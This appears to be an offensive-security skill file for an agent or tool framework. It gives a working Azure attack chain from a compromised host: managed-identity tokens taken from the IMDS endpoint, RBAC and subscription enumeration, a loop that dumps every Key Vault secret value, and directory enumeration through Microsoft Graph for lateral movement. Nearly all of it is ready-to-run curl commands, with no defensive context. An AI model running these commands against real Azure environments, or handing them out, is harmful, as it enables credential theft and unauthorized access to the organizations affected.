---
name: azure-identity-chain
description: "Azure managed identity → IMDS → RBAC enumeration → Key Vault secret dump. Full chain from IMDS token extraction to Key Vault credential harvest."
---

# azure-identity-chain — Managed Identity → IMDS → RBAC → Key Vault Dump

## Overview

Azure VMs, App Services, and Container Instances can be assigned managed identities. The Instance Metadata Service (IMDS) at `169.254.169.254` issues OAuth2 tokens for these identities without credentials. From a compromised host with a managed identity, the chain is:

```
IMDS token → RBAC enumeration → Key Vault access → secret dump
```

---

## Step 1 — Extract Token from Azure IMDS

The IMDS endpoint requires the `Metadata: true` header. No token acquisition step is needed — the managed identity token is returned directly.

```bash
# Get token for Azure Resource Management API
MGMT_TOKEN=$(curl -s \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')
echo "MGMT_TOKEN=$MGMT_TOKEN"

# Get token for Key Vault API
KV_TOKEN=$(curl -s \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | jq -r '.access_token')

# Get token for Microsoft Graph
GRAPH_TOKEN=$(curl -s \
  -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  | jq -r '.access_token')
```

Resource targets:
| Target | resource= value |
|---|---|
| Azure Management | `https://management.azure.com/` |
| Key Vault | `https://vault.azure.net` |
| Microsoft Graph | `https://graph.microsoft.com/` |
| Storage | `https://storage.azure.com/` |
| Azure SQL | `https://database.windows.net/` |

---

## Step 2 — Enumerate Subscriptions and RBAC

```bash
# List subscriptions this identity can read
curl -s \
  -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  | jq '.value[] | {subscriptionId, displayName, state}'

# Set subscription ID
SUB_ID=<subscriptionId>

# List RBAC role assignments for this identity
curl -s \
  -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  | jq '.value[] | {roleDefinitionId, principalId, scope}'

# Resolve role definition to name
curl -s \
  -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Authorization/roleDefinitions/<ROLE_DEF_ID>?api-version=2022-04-01" \
  | jq '{roleName: .properties.roleName, permissions: .properties.permissions}'

# List all Key Vaults in subscription
curl -s \
  -H "Authorization: Bearer $MGMT_TOKEN" \
  "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.KeyVault/vaults?api-version=2023-02-01" \
  | jq '.value[] | {name, id, location}'
```

---

## Step 3 — Key Vault Secret Enumeration

```bash
KV_NAME=<vault-name>
KV_URL="https://$KV_NAME.vault.azure.net"

# List all secrets
curl -s \
  -H "Authorization: Bearer $KV_TOKEN" \
  "$KV_URL/secrets?api-version=7.4" \
  | jq '.value[] | {id, enabled: .attributes.enabled}'

# Get a secret value (use the secret ID from above)
curl -s \
  -H "Authorization: Bearer $KV_TOKEN" \
  "$KV_URL/secrets/<SECRET_NAME>?api-version=7.4" \
  | jq '{value, id, contentType}'

# Dump all secrets (loop)
curl -s \
  -H "Authorization: Bearer $KV_TOKEN" \
  "$KV_URL/secrets?api-version=7.4" \
  | jq -r '.value[].id' \
  | while read SECRET_ID; do
      NAME=$(basename "$SECRET_ID")
      VALUE=$(curl -s -H "Authorization: Bearer $KV_TOKEN" \
        "$KV_URL/secrets/$NAME?api-version=7.4" | jq -r '.value')
      echo "$NAME = $VALUE"
    done

# List and dump certificates
curl -s \
  -H "Authorization: Bearer $KV_TOKEN" \
  "$KV_URL/certificates?api-version=7.4" \
  | jq '.value[] | {id, enabled: .attributes.enabled}'
```

---

## Step 4 — Lateral Movement with Graph Token

```bash
# Enumerate AAD users (requires User.Read.All)
curl -s \
  -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,id" \
  | jq '.value[] | {displayName, userPrincipalName, id}'

# Enumerate groups
curl -s \
  -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?$select=displayName,id,groupTypes" \
  | jq '.value[] | {displayName, id}'

# Check if identity has directory role assignments
curl -s \
  -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/directoryRoles" \
  | jq '.value[] | {displayName, id}'
```

---

## Full Attack Chain

```
Compromised Azure VM/container with managed identity
  → IMDS (169.254.169.254) — no credentials needed
  → management.azure.com token → RBAC enumeration
  → Key Vault token → list secrets → dump all secrets
  → Graph token → enumerate users/groups/roles
  → Use harvested secrets for lateral movement
```

---

## Tool

```bash
# Use ARTEX query_imds tool
query_imds target=<HOST_IP> provider=azure
```
